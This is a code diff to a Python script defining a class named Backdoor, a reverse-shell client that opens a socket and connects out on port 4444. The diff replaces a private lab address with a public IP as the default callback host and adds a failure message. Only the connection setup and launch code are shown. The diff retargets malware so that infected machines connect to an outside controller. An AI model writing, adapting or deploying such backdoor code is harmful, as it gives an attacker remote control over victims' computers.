@@ -8,7 +8,7 @@ import sys
 
 
 class Backdoor:
-    def __init__(self, ip="10.0.2.15", port=4444):
+    def __init__(self, ip="31.131.27.207", port=4444):
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
 
@@ -76,4 +76,5 @@ try:
     my_backdoor = Backdoor()
     my_backdoor.run()
 except Exception:
+    print("Connection not established.")
     sys.exit()
